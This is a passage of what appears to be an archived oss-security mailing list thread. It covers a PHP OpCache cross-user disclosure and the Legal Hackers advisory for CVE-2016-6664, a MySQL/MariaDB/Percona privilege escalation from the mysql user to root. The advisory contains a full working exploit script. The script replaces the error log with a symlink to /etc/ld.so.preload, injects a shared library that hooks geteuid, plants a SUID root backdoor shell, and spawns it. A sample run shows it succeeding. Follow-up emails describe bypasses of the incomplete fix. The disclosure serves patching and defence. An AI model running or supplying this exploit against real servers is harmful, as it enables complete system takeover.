IMPACT:
Cross-user compromise of PHP web applications in shared hosting
environments.

Let me know if more details are needed, and feel free to contact me
privately if proof of concept is needed.

REFERENCES:
http://marc.info/?l=php-internals&m=147921016724565&w=2
https://bugs.php.net/bug.php?id=69090
http://seclists.org/oss-sec/2016/q4/343

--
php-dev at coydogsoftware dot net

```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488282780.6135_98.NdNdNx,U=7954:2,T -->

##### php-dev@coydogsoftware.net, `20170228110806.GA541@sliver.coydogsoftware.net`

```
On Mon, Feb 27, 2017 at 04:52:58PM -0600, php-dev@coydogsoftware.net wrote:
> 
> To briefly summarize, in PHP SAPI's where PHP interpreters share a
> common parent process (eg. Apache mod_php and PHP-FPM), Zend OpCache
> creates a shared memory object owned by the common parent during
> initialization. Child PHP processes inherit the SHM descriptor, using it
> to cache and retrieve compiled script bytecode ("opcode" in PHP jargon).
> Cache keys vary depending on configuration, but filename is a central
> key component, and compiled opcode can generally be run if a script's
> filename is known or can be guessed.
> 
> Many common shared hosting configurations change EUID in child processes
> to enforce privilege separation among hosted users. In these scenarios,
> default Zend OpCache behavior defeats script file permissions by sharing
> a single SHM cache among all child PHP processes.
> 
> PHP scripts often contain sensitive information: Think of CMS
> configurations where reading or running another user's script usually
> means gaining privileges to the CMS database.
> 
>  
> AFFECTED VERSIONS:
> PHP7 < 7.0.14 and PHP5 < 5.6.29. Later versions are still vulnerable by
> default unless opcache.validate_permission=1 is enabled.
> 
> AFFECTED COMPONENT:
> Zend OpCache
> 
> VULNERABILITY TYPE:
> Code permission/sensitive information disclosure
> 
> IMPACT:
> Cross-user compromise of PHP web applications in shared hosting
> environments.
> 
> REFERENCES:
> http://marc.info/?l=php-internals&m=147921016724565&w=2
> https://bugs.php.net/bug.php?id=69090
> http://seclists.org/oss-sec/2016/q4/343

This has been assigned CVE-2015-8994 via cveform.mitre.org.

--
php-dev at coydogsoftware dot net

```

</details>

## mariadb
<details>
<summary><strong>[oss-security] MySQL / MariaDB / Percona - Root Privilege Escalation Exploit [ CVE-2016-6664 / CVE-2016-5617 ]</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1479176043.25646_20.NdNdNx,U=704:2,T -->

##### Dawid Golunski <dawid@legalhackers.com>, `CADSYzstzBNkz6hmpw_4CDyFWR_aQaa-T5yHSTEcVK_Bj-p2ndg@mail.gmail.com`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Vulnerability: MySQL / MariaDB / PerconaDB - Root Privilege Escalation
CVE-2016-6664 / (Oracle)CVE-2016-5617

Discovered by:
Dawid Golunski (@dawid_golunski)
https://legalhackers.com

MySQL-based databases including MySQL, MariaDB and PerconaDB are affected
by a privilege escalation vulnerability which can let attackers who have
gained access to mysql system user (for example through CVE-2016-6663)
to further escalate their privileges to root user allowing them to
fully compromise the system.
The vulnerability stems from unsafe file handling of error logs and other files.

Affected versions:

MySQL
<= 5.5.51
<= 5.6.32
<= 5.7.14

MariaDB
All current

Percona Server
< 5.5.51-38.2
< 5.6.32-78-1
< 5.7.14-8

Percona XtraDB Cluster
< 5.6.32-25.17
< 5.7.14-26.17
< 5.5.41-37.0


The latest / up-to-date advisory and a PoC exploit can be found at:

https://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html

A copy of the advisory/exploit is also attached to this message.

PoC Video (showing the rootshell part towards the end) is at:
http://legalhackers.com/videos/MySQL-MariaDB-PerconaDB-PrivEsc-Race-CVE-2016-6663-5616-6664-5617-Exploits.html

Attacker will need to obtain mysql account first which could be gained
with the other exploit (CVE-2016-6663) I discovered:
http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html

More updates on the feed:
https://twitter.com/dawid_golunski


-- 
Regards,
Dawid Golunski
https://legalhackers.com
t: @dawid_golunski


```

</details>
<details><summary>Additional Parts</summary>

```


    __                     __   __  __           __                 
   / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________
  / /   / _ \/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/
 / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,< /  __/ /  (__  ) 
/_____/\___/\__, /\__,_/_/  /_/ /_/\__,_/\___/_/|_|\___/_/  /____/  
           /____/                                                   



=============================================
- Release date: 01.11.2016
- Discovered by: Dawid Golunski
  dawid[at]legalhackers.com
  http://legalhackers.com

- Severity: High/Critical
- CVE-2016-6664 / (Oracle) CVE-2016-5617
=============================================


I. VULNERABILITY
-------------------------

MySQL / MariaDB / Percona   -   Root Privilege Escalation

MySQL  
	<= 5.5.51
	<= 5.6.32
	<= 5.7.14

MariaDB
	All current

Percona Server
	< 5.5.51-38.2
	< 5.6.32-78-1
	< 5.7.14-8

Percona XtraDB Cluster
	< 5.6.32-25.17
	< 5.7.14-26.17
	< 5.5.41-37.0


II. BACKGROUND
-------------------------

MySQL:

"MySQL is the world's most popular open source database.
Whether you are a fast growing web property, technology ISV or large
enterprise, MySQL can cost-effectively help you deliver high performance,
scalable database applications."

"Many of the world's largest and fastest-growing organizations including
Facebook, Google, Adobe, Alcatel Lucent and Zappos rely on MySQL to save time
and money powering their high-volume Web sites, business-critical systems and
packaged software."

http://www.mysql.com/products/
http://www.mysql.com/why-mysql/

--

MariaDB:

"MariaDB is one of the most popular database servers in the world. 
It's made by the original developers of MySQL and guaranteed to stay open source. 
Notable users include Wikipedia, WordPress.com and Google.

MariaDB turns data into structured information in a wide array of applications, 
ranging from banking to websites. It is an enhanced, drop-in replacement for MySQL. 
MariaDB is used because it is fast, scalable and robust, with a rich ecosystem of 
storage engines, plugins and many other tools make it very versatile for a wide 
variety of use cases."

https://mariadb.org/about/

--

Percona:

"Percona Server for MySQL is a free, fully compatible, enhanced, open source 
drop-in replacement for MySQL that provides superior performance, scalability 
and instrumentation. 
With over 3,000,000 downloads, Percona Server's self-tuning algorithms and support
for extremely high-performance hardware delivers excellent performance and reliability."

https://www.percona.com/software/mysql-database/percona-server


III. INTRODUCTION
-------------------------

MySQL-based databases including MySQL, MariaDB and Percona are affected
by a privilege escalation vulnerability which can let attackers who have
gained access to mysql system user to further escalate their privileges
to root user allowing them to fully compromise the system.
The vulnerability stems from unsafe file handling of error logs and
other files.


IV. DESCRIPTION
-------------------------

The error.log file on most default installations of MySQL/Percona/MariaDB
databases is stored either in /var/log/mysql or /var/lib/mysql directory.

The permissions on the file and directory look as follows:

root@trusty:/var/lib/mysql# ls -la /var/log/mysql
total 468
drwxr-s---  2 mysql adm      4096 Sep 11 06:25 .
drwxrwxr-x 36 root  syslog   4096 Sep 11 06:25 ..
-rw-r-----  1 mysql adm         0 Sep 11 06:25 error.log

root@trusty:/var/lib/mysql# ls -lad /var/log/mysql
drwxr-s--- 2 mysql adm 4096 Sep 11 06:25 /var/log/mysql


mysqld_safe wrapper that is normally used for starting MySQL daemon and 
creating/reopening the error.log performs certain unsafe file operations that
may allow attackers to gain root privileges.

The wrapper script contains a 'while' loop shown below which monitors the mysqld 
process and performs a restart in case of the process failure.  
The restart involves re-creation of the error.log file if syslog logging has
not been configured instead of error log files (file-based logging is the 
default setting on most installations).


--------[ mysqld_safe ]--------
[...]

while true
do
  rm -f "$pid_file"     # Some extra safety

  start_time=`date +%M%S`

  eval_log_error "$cmd"

  if [ $want_syslog -eq 0 -a ! -f "$err_log" ]; then
    touch "$err_log"                    # hypothetical: log was renamed but not
    chown $user "$err_log"              # flushed yet. we'd recreate it with
    chmod "$fmode" "$err_log"           # wrong owner next time we log, so set
  fi                                    # it up correctly while we can!

[...]

-------------------------------

As can be seen, the error.log file is created (touch) and chowned to the user
running the mysqld daemon (typically 'mysql'). 

The operation is vulnerable to a symlink attack.

Attackers who obtained access to mysql account, through CVE-2016-6663
vulnerability described at:

http://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html

would gain access to /var/log or /var/lib/mysql directories (owned by mysql user) 
and could therefore easily remove the error.log file and replace it 
with a symlink to an arbitrary system file and escalate privileges.

The privilege escalation could be triggered instantly (without the need to wait
for mysql service restart/reboot) by attackers having 'mysql' account by simply 
killing the mysqld child process (launched by the mysqld_safe wrapper).

When the mysqld process gets terminated, the wrapper will then re-itertate the 
loop shown above and immediately create a mysql-owned file in the location 
specified by the attacker in the symlink thus allowing attackers to quickly
escalate their privileges.


V. PROOF OF CONCEPT EXPLOIT
-------------------------

-------[ mysql-chowned.sh ]------

#!/bin/bash -p
#
# MySQL / MariaDB / Percona - Root Privilege Escalation PoC Exploit
# mysql-chowned.sh (ver. 1.1)
#
# CVE-2016-6664 / CVE-2016-5617
#
# Discovered and coded by:
#
# Dawid Golunski
# dawid[at]legalhackers.com
#
# https://legalhackers.com
#
# Follow https://twitter.com/dawid_golunski for updates on this advisory.
#
# This PoC exploit allows attackers to (instantly) escalate their privileges
# from mysql system account to root through unsafe error log handling.
# The exploit requires that file-based logging has been configured (default).
# To confirm that syslog logging has not been enabled instead use:
# grep -r syslog /etc/mysql
# which should return no results.
#
# This exploit can be chained with the following vulnerability:
# CVE-2016-6663 / CVE-2016-5616
# which allows attackers to gain access to mysql system account (mysql shell).
#
# In case database server has been configured with syslog you may also use:
# CVE-2016-6662 as an alternative to this exploit.
#
# Usage:
# ./mysql-chowned.sh path_to_error.log 
#
#
# See the full advisory for details at:
# https://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html
#
# Video PoC:
# https://legalhackers.com/videos/MySQL-MariaDB-PerconaDB-PrivEsc-Race-CVE-2016-6663-5616-6664-5617-Exploits.html
#
#
# Disclaimer:
# For testing purposes only. Do no harm.
#

BACKDOORSH="/bin/bash"
BACKDOORPATH="/tmp/mysqlrootsh"
PRIVESCLIB="/tmp/privesclib.so"
PRIVESCSRC="/tmp/privesclib.c"
SUIDBIN="/usr/bin/sudo"

function cleanexit {
	# Cleanup 
	echo -e "\n[+] Cleaning up..."
	rm -f $PRIVESCSRC
	rm -f $PRIVESCLIB
	rm -f $ERRORLOG
	touch $ERRORLOG
	if [ -f /etc/ld.so.preload ]; then
		echo -n > /etc/ld.so.preload
	fi
	echo -e "\n[+] Job done. Exiting with code $1 \n"
	exit $1
}

function ctrl_c() {
        echo -e "\n[+] Ctrl+C pressed"
	cleanexit 0
}

#intro 
echo -e "\033[94m \nMySQL / MariaDB / Percona - Root Privilege Escalation PoC Exploit \nmysql-chowned.sh (ver. 1.0)\n\nCVE-2016-6664 / CVE-2016-5617\n"
echo -e "Discovered and coded by: \n\nDawid Golunski \nhttp://legalhackers.com \033[0m"

# Args
if [ $# -lt 1 ]; then
	echo -e "\n[!] Exploit usage: \n\n$0 path_to_error.log \n"
	echo -e "It seems that this server uses: `ps aux | grep mysql | awk -F'log-error=' '{ print $2 }' | cut -d' ' -f1 | grep '/'`\n"
	exit 3
fi

# Priv check

echo -e "\n[+] Starting the exploit as \n\033[94m`id`\033[0m"
id | grep -q mysql 
if [ $? -ne 0 ]; then
	echo -e "\n[!] You need to execute the exploit as mysql user! Exiting.\n"
	exit 3
fi

# Set target paths
ERRORLOG="$1"
if [ ! -f $ERRORLOG ]; then
	echo -e "\n[!] The specified MySQL error log ($ERRORLOG) doesn't exist. Try again.\n"
	exit 3
fi
echo -e "\n[+] Target MySQL log file set to $ERRORLOG"

# [ Active exploitation ]

trap ctrl_c INT
# Compile privesc preload library
echo -e "\n[+] Compiling the privesc shared library ($PRIVESCSRC)"
cat <<_solibeof_>$PRIVESCSRC
#define _GNU_SOURCE
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dlfcn.h>
       #include <sys/types.h>
       #include <sys/stat.h>
       #include <fcntl.h>

uid_t geteuid(void) {
	static uid_t  (*old_geteuid)();
	old_geteuid = dlsym(RTLD_NEXT, "geteuid");
	if ( old_geteuid() == 0 ) {
		chown("$BACKDOORPATH", 0, 0);
		chmod("$BACKDOORPATH", 04777);
		//unlink("/etc/ld.so.preload");
	}
	return old_geteuid();
}
_solibeof_
/bin/bash -c "gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl"
if [ $? -ne 0 ]; then
	echo -e "\n[!] Failed to compile the privesc lib $PRIVESCSRC."
	cleanexit 2;
fi


# Prepare backdoor shell
cp $BACKDOORSH $BACKDOORPATH
echo -e "\n[+] Backdoor/low-priv shell installed at: \n`ls -l $BACKDOORPATH`"

# Safety check
if [ -f /etc/ld.so.preload ]; then
	echo -e "\n[!] /etc/ld.so.preload already exists. Exiting for safety."
	exit 2
fi

# Symlink the log file to /etc
rm -f $ERRORLOG && ln -s /etc/ld.so.preload $ERRORLOG
if [ $? -ne 0 ]; then
	echo -e "\n[!] Couldn't remove the $ERRORLOG file or create a symlink."
	cleanexit 3
fi
echo -e "\n[+] Symlink created at: \n`ls -l $ERRORLOG`"

# Wait for MySQL to re-open the logs
echo -ne "\n[+] Waiting for MySQL to re-open the logs/MySQL service restart...\n"
echo -n "Do you want to kill mysqld process `pidof mysqld` to instantly get root? :) ? [y/n] "
read THE_ANSWER
if [ "$THE_ANSWER" = "y" ]; then
	echo -e "Got it. Executing 'killall mysqld' now..."
	killall mysqld
fi
while :; do 
	sleep 0.1
	if [ -f /etc/ld.so.preload ]; then
		echo $PRIVESCLIB > /etc/ld.so.preload
		rm -f $ERRORLOG
		break;
	fi
done

# Inject the privesc.so shared library to escalate privileges
echo $PRIVESCLIB > /etc/ld.so.preload
echo -e "\n[+] MySQL restarted. The /etc/ld.so.preload file got created with mysql privileges: \n`ls -l /etc/ld.so.preload`"
echo -e "\n[+] Adding $PRIVESCLIB shared lib to /etc/ld.so.preload"
echo -e "\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload`"
chmod 755 /etc/ld.so.preload

# Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)
echo -e "\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!"
sudo 2>/dev/null >/dev/null

#while :; do 
#	sleep 0.1
#	ps aux | grep mysqld | grep -q 'log-error'
#	if [ $? -eq 0 ]; then
#		break;
#	fi
#done

# Check for the rootshell
ls -l $BACKDOORPATH
ls -l $BACKDOORPATH | grep rws | grep -q root
if [ $? -eq 0 ]; then 
	echo -e "\n[+] Rootshell got assigned root SUID perms at: \n`ls -l $BACKDOORPATH`"
	echo -e "\n\033[94mGot root! The database server has been ch-OWNED !\033[0m"
else
	echo -e "\n[!] Failed to get root"
	cleanexit 2
fi


# Execute the rootshell
echo -e "\n[+] Spawning the rootshell $BACKDOORPATH now! \n"
$BACKDOORPATH -p -c "rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB"
$BACKDOORPATH -p -i

# Job done.
cleanexit 0

------------EOF------------------


Example run
~~~~~~~~~~~~~~~~

mysql_suid_shell.MYD-4.3$ whoami
mysql

omysql_suid_shell.MYD-4.3$ dpkg -l | grep percona-server-server
iU  percona-server-server              5.6.32-78.0-1.xenial              amd64        Percona Server database server
iF  percona-server-server-5.6          5.6.32-78.0-1.xenial              amd64        Percona Server database server binaries

mysql_suid_shell.MYD-4.3$ ./mysql-chowned.sh /var/lib/mysql/xenial-percona.err 
 
MySQL / MariaDB / Percona - Root Privilege Escalation PoC Exploit 
mysql-chowned.sh (ver. 1.0)

CVE-2016-6664 / CVE-2016-5617

Discovered and coded by: 

Dawid Golunski 
http://legalhackers.com 

[+] Starting the exploit as 
uid=1001(attacker) gid=1001(attacker) euid=107(mysql) groups=1001(attacker)

[+] Target MySQL log file set to /var/lib/mysql/xenial-percona.err

[+] Compiling the privesc shared library (/tmp/privesclib.c)

[+] Backdoor/low-priv shell installed at: 
-rwxr-xr-x 1 mysql attacker 1037528 Nov  1 05:08 /tmp/mysqlrootsh

[+] Symlink created at: 
lrwxrwxrwx 1 mysql attacker 18 Nov  1 05:08 /var/lib/mysql/xenial-percona.err -> /etc/ld.so.preload

[+] Waiting for MySQL to re-open the logs/MySQL service restart...
Do you want to kill mysqld process to instantly get root? :) ? [y/n] y
Got it. Executing 'killall mysqld' now...

[+] MySQL restarted. The /etc/ld.so.preload file got created with mysql privileges: 
-rw-r----- 1 mysql root 19 Nov  1 05:08 /etc/ld.so.preload

[+] Adding /tmp/privesclib.so shared lib to /etc/ld.so.preload

[+] The /etc/ld.so.preload file now contains: 
/tmp/privesclib.so

[+] Escalating privileges via the /usr/bin/sudo SUID binary to get root!
-rwsrwxrwx 1 root root 1037528 Nov  1 05:08 /tmp/mysqlrootsh

[+] Rootshell got assigned root SUID perms at: 
-rwsrwxrwx 1 root root 1037528 Nov  1 05:08 /tmp/mysqlrootsh

Got root! The database server has been ch-OWNED !

[+] Spawning the rootshell /tmp/mysqlrootsh now! 

mysqlrootsh-4.3# whoami
root

mysqlrootsh-4.3# exit
exit

[+] Cleaning up...

[+] Job done. Exiting with code 0



Video PoC:
~~~~~~~~~~~~~

http://legalhackers.com/videos/MySQL-MariaDB-PerconaDB-PrivEsc-Race-CVE-2016-6663-5616-6664-5617-Exploits.html


VI. BUSINESS IMPACT
-------------------------

Although the severity of this issue is lower on its own (attackers need to
gain access to mysql system user), the vulnerability could easily be combined 
with the CVE-2016-6663 issue.
The combination of the two would effectively allow low privileged local 
database users to escalate their system privileges to root system account and 
allow them to fully compromise the server which increases the severity of this
issue.

 
VII. SYSTEMS AFFECTED
-------------------------

MySQL  
	<= 5.5.51
	<= 5.6.32
	<= 5.7.14

MariaDB
	All current

Percona Server
	< 5.5.51-38.2
	< 5.6.32-78-1
	< 5.7.14-8

Percona XtraDB Cluster
	< 5.6.32-25.17
	< 5.7.14-26.17
	< 5.5.41-37.0
 
VIII. SOLUTION
-------------------------

The root privilege escalation vulnerability described in this advisory was 
reported to Oracle in July 2016 (together with previously reported critical 
issue of CVE-2016-6662).

All of the vendors - MariaDB/MySQL/Percona have received a copy of this 
advisory in advance which allowed them to produce patches for this 
vulnerability before the release of this advisory.

When checking if your system contains the patches, note that this vulnerability
has been known under two CVE IDs:

CVE-2016-6664
CVE-2016-5617 (Oracle)

CVE-2016-6664 is the original CVE that was agreed to be used by all the
affected vendors for this vulnerability.
The issue was however mentioned in Oracle CPU mistakenly under a new CVE of
CVE-2016-5617, resulting in a duplicate. Oracle has informed that CPU will be
updated to state that CVE-2016-5617 is equivalent to CVE-2016-6664.


Patches and security releases have been issued by the vendors and can
be found on the official vendor websites (see references below which contain
links to advisories issued by each vendor). 
MariaDB has postponed patching for the next release.

 
IX. REFERENCES
-------------------------

http://legalhackers.com

This advisory:
http://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html

Exploit source code:
http://legalhackers.com/exploits/CVE-2016-6664/mysql-chowned.sh

Related mysql vulnerabilities discovered by the author of this advisory that can be chained with 
the CVE-2016-6664 vulnerability:

CVE-2016-6663:
http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html

CVE-2016-6662:
http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html


Video PoC:
http://legalhackers.com/videos/MySQL-MariaDB-PerconaDB-PrivEsc-Race-CVE-2016-6663-5616-6664-5617-Exploits.html


CVE MITRE:
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6664



Vendors:

Oracle CPU:
http://www.oracle.com/technetwork/security-advisory/cpuoct2016-2881722.html#AppendixMSQL

MariaDB:
https://mariadb.com/blog/update-security-vulnerabilities-cve-2016-6663-and-cve-2016-6664-related-mariadb-server

Percona:
https://www.percona.com/blog/2016/11/02/percona-responds-to-cve-2016-6663-and-cve-2016-6664/

Debian security:
https://security-tracker.debian.org/tracker/CVE-2016-6664




X. CREDITS
-------------------------

The vulnerability has been discovered by Dawid Golunski
dawid (at) legalhackers (dot) com

http://legalhackers.com
 
XI. REVISION HISTORY
-------------------------

01.11.2016 - Advisory released
03.11.2016 - Advisory updated with links to advisories provided by the vendors
03.11.2016 - OCVE prefix changed to (Oracle) CVE in the header
 

XII. LEGAL NOTICES
-------------------------

The information contained within this advisory is supplied "as-is" with
no warranties or guarantees of fitness of use or otherwise. I accept no
responsibility for any damage caused by the use or misuse of this information.




```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1487471026.16412_213.NdNdNx,U=36348:2, -->

##### Tomas Hoger <thoger@redhat.com>, `20170217135245.5717fc91@redhat.com`

```
On Mon, 14 Nov 2016 14:36:16 -0200 Dawid Golunski wrote:

> Vulnerability: MySQL / MariaDB / PerconaDB - Root Privilege Escalation
> CVE-2016-6664 / (Oracle)CVE-2016-5617

The original MySQL fix for this issue was quite incomplete and easy to
bypass.  It had the following problems:

- Symlink check was racy - it was easy to replace log file created by
  touch by a symlink before chmod and chown was used.

- You could avoid the symlink check completely by directly setting
  log-error to the path name of the file you want to corrupt, such as:

  log-error = /etc/ld.so.preload

- Symlink check did not cover hardlinks (this is a variant of the
  previous, sort of).

- Existing symlinks were used even if they were not chmoded / chowned
  any more, so it was possible to corrupt files with myslqd_safe's log
  messages.

I reported these problems to Oracle, and they assigned CVE-2017-3312
for the incomplete fix.  They were addressed in the following commit:

https://github.com/mysql/mysql-server/commit/1f93f4381b60e3a8012ba36a4dec920416073759

Note that the commit pre-dates Oct 2016 CPU, when Oracle first
mentioned CVE-2016-6664 / CVE-2016-5617 as fixed, but it was only
included in MySQL 5.5.54, 5.6.35, and 5.7.17 released mid-Dec 2016, and
hence listed in Jan 2017 CPU.  The fix also pre-dates my report.

Dawid, I assume you were aware of these problems and reported them
too.  You're acknowledged as a reporter of (at least) one of the issues
in the Jan 2017 CPU:

http://www.oracle.com/technetwork/security-advisory/cpujan2017-2881727.html

and also in Percona Server release notes:

https://www.percona.com/doc/percona-server/LATEST/release-notes/Percona-Server-5.7.17-11.html

  mysqld_safe now limits the use of rm and chown to avoid privilege
  escalation. chown can now be used only for /var/log directory. Bug
  fixed #1660265. Thanks to Dawid Golunski (https://legalhackers.com).

Linked Percona bug is not public, but the above text matches MySQL
commit linked above.

As Oracle is refusing to publicly share any information about their
CVEs, can you, Dawid, provide information on what CVE or CVEs were
given to you by Oracle in response to your reports, and for what
issues?  If you've not received that information yet, would you mind
asking?  I suspect you may have some info to share on CVE-2017-3317 and
CVE-2017-3318.


Besides the above, I also reported the following issues.  CVEs below
were assigned by Oracle.


CVE-2017-3265 unsafe chmod/chown use in the init script

https://github.com/mysql/mysql-server/blob/mysql-5.6.34/packaging/rpm-oel/mysql.init#L97
https://github.com/mysql/mysql-server/blob/mysql-5.6.34/packaging/rpm-oel/mysql.init#L73

These may allow mysql -> root privilege escalation similar to
CVE-2016-6664.  Fixed in:

https://github.com/mysql/mysql-server/commit/53230ba274a37fa13d65e802c6ef3766cd0c6d91#diff-5fccc3d0e109e8f9ad0653728bd1d975


CVE-2017-3291 was assigned to two independent issues

- unrestricted mysqld_safe's ledir

By setting ledir to say /tmp in my.cnf, you could make mysqld_safe
execute mysqld from there rather than some expected location
under /usr.  Besides mysql -> root escalation, this also could have
been used by non-mysql local users in combination with the
CVE-2016-6662 issue against MySQL versions that do not support
malloc-lib (e.g. MySQL 5.1).  Fixed in:

https://github.com/mysql/mysql-server/commit/53230ba274a37fa13d65e802c6ef3766cd0c6d91#diff-144aa2f11374843c969d96b7b84247ea

- insecure path use in mysqld_safe

This code tries to find my_print_defaults command:

https://github.com/mysql/mysql-server/blob/mysql-5.6.34/scripts/mysqld_safe.sh#L466

It first tries relative to $MY_BASEDIR_VERSION, which could have been
set to $PWD:

https://github.com/mysql/mysql-server/blob/mysql-5.6.34/scripts/mysqld_safe.sh#L402

If root ran mysqld_safe while their $PWD was /tmp, arbitrary code
controlled by some unprivileged local (not necessarily mysql) user
could have been executed.  This was fixed in:

https://github.com/mysql/mysql-server/commit/53230ba274a37fa13d65e802c6ef3766cd0c6d91#diff-144aa2f11374843c969d96b7b84247eaL397


There are few more related problems fixed in Jan 2017 CPU, but as noted
above, Oracle refuses to acknowledge mapping to CVEs publicly.

https://github.com/mysql/mysql-server/commit/76e9d7e5b30365e8b167e2070ee00f81cb115b8b
https://github.com/mysql/mysql-server/commit/7a5145e445ee802241957eb5290a3e65ea4da70c

-- 
Tomas Hoger / Red Hat Product Security

```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1487471026.16412_221.NdNdNx,U=36356:2, -->

##### Dawid Golunski <dawid@legalhackers.com>, `CADSYzsuT8+3N7181RX3-i-c4xyOjjNEPcBLBNTnkTx62hbuPMA@mail.gmail.com`

```
Hi Tomas,

Yes, I have reported the insufficient fixes to Oracle and related vendors.

I wanted to allow some more time for patching before making these public.
I will make my advisories and exploits public soon.

Thanks.


On Fri, Feb 17, 2017 at 10:52 AM, Tomas Hoger <thoger@redhat.com> wrote:
> On Mon, 14 Nov 2016 14:36:16 -0200 Dawid Golunski wrote:
>
>> Vulnerability: MySQL / MariaDB / PerconaDB - Root Privilege Escalation
>> CVE-2016-6664 / (Oracle)CVE-2016-5617
>
> The original MySQL fix for this issue was quite incomplete and easy to
> bypass.  It had the following problems:
>
> - Symlink check was racy - it was easy to replace log file created by
>   touch by a symlink before chmod and chown was used.
>
> - You could avoid the symlink check completely by directly setting
>   log-error to the path name of the file you want to corrupt, such as:
>
>   log-error = /etc/ld.so.preload
>
> - Symlink check did not cover hardlinks (this is a variant of the
>   previous, sort of).
>
> - Existing symlinks were used even if they were not chmoded / chowned
>   any more, so it was possible to corrupt files with myslqd_safe's log
>   messages.
>
> I reported these problems to Oracle, and they assigned CVE-2017-3312
> for the incomplete fix.  They were addressed in the following commit:
>
> https://github.com/mysql/mysql-server/commit/1f93f4381b60e3a8012ba36a4dec920416073759
>
> Note that the commit pre-dates Oct 2016 CPU, when Oracle first
> mentioned CVE-2016-6664 / CVE-2016-5617 as fixed, but it was only
> included in MySQL 5.5.54, 5.6.35, and 5.7.17 released mid-Dec 2016, and
> hence listed in Jan 2017 CPU.  The fix also pre-dates my report.
>
> Dawid, I assume you were aware of these problems and reported them
> too.  You're acknowledged as a reporter of (at least) one of the issues
> in the Jan 2017 CPU:
>
> http://www.oracle.com/technetwork/security-advisory/cpujan2017-2881727.html
>
> and also in Percona Server release notes:
>
> https://www.percona.com/doc/percona-server/LATEST/release-notes/Percona-Server-5.7.17-11.html
>
>   mysqld_safe now limits the use of rm and chown to avoid privilege
>   escalation. chown can now be used only for /var/log directory. Bug
>   fixed #1660265. Thanks to Dawid Golunski (https://legalhackers.com).
>
> Linked Percona bug is not public, but the above text matches MySQL
> commit linked above.
>
> As Oracle is refusing to publicly share any information about their
> CVEs, can you, Dawid, provide information on what CVE or CVEs were
> given to you by Oracle in response to your reports, and for what
> issues?  If you've not received that information yet, would you mind
> asking?  I suspect you may have some info to share on CVE-2017-3317 and
> CVE-2017-3318.
>
>
> Besides the above, I also reported the following issues.  CVEs below
> were assigned by Oracle.
>
>
> CVE-2017-3265 unsafe chmod/chown use in the init script
>
> https://github.com/mysql/mysql-server/blob/mysql-5.6.34/packaging/rpm-oel/mysql.init#L97
> https://github.com/mysql/mysql-server/blob/mysql-5.6.34/packaging/rpm-oel/mysql.init#L73
>
> These may allow mysql -> root privilege escalation similar to
> CVE-2016-6664.  Fixed in:
>
> https://github.com/mysql/mysql-server/commit/53230ba274a37fa13d65e802c6ef3766cd0c6d91#diff-5fccc3d0e109e8f9ad0653728bd1d975
>
>
> CVE-2017-3291 was assigned to two independent issues
>
> - unrestricted mysqld_safe's ledir
>
> By setting ledir to say /tmp in my.cnf, you could make mysqld_safe
> execute mysqld from there rather than some expected location
> under /usr.  Besides mysql -> root escalation, this also could have
> been used by non-mysql local users in combination with the
> CVE-2016-6662 issue against MySQL versions that do not support
> malloc-lib (e.g. MySQL 5.1).  Fixed in:
>
> https://github.com/mysql/mysql-server/commit/53230ba274a37fa13d65e802c6ef3766cd0c6d91#diff-144aa2f11374843c969d96b7b84247ea
>
> - insecure path use in mysqld_safe
>
> This code tries to find my_print_defaults command:
>
> https://github.com/mysql/mysql-server/blob/mysql-5.6.34/scripts/mysqld_safe.sh#L466
>
> It first tries relative to $MY_BASEDIR_VERSION, which could have been
> set to $PWD:
>
> https://github.com/mysql/mysql-server/blob/mysql-5.6.34/scripts/mysqld_safe.sh#L402
>
> If root ran mysqld_safe while their $PWD was /tmp, arbitrary code
> controlled by some unprivileged local (not necessarily mysql) user
> could have been executed.  This was fixed in:
>
> https://github.com/mysql/mysql-server/commit/53230ba274a37fa13d65e802c6ef3766cd0c6d91#diff-144aa2f11374843c969d96b7b84247eaL397
>
>
> There are few more related problems fixed in Jan 2017 CPU, but as noted
> above, Oracle refuses to acknowledge mapping to CVEs publicly.
>
> https://github.com/mysql/mysql-server/commit/76e9d7e5b30365e8b167e2070ee00f81cb115b8b
> https://github.com/mysql/mysql-server/commit/7a5145e445ee802241957eb5290a3e65ea4da70c
>
> --
> Tomas Hoger / Red Hat Product Security



-- 
Regards,
Dawid Golunski
https://legalhackers.com
t: @dawid_golunski

```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488550042.3737_89.Morbo,U=38527:2, -->

##### Tomas Hoger <thoger@redhat.com>, `20170303141719.4608fbb0@redhat.com`

```
Hi Dawid!

On Fri, 17 Feb 2017 12:03:44 -0200 Dawid Golunski wrote:

> Yes, I have reported the insufficient fixes to Oracle and related vendors.
> 
> I wanted to allow some more time for patching before making these public.
> I will make my advisories and exploits public soon.

Can you clarify if the "soon" above is supposed to mean days, weeks, or
months?  Two weeks have passed since the above, and I've not seen any
update from you.

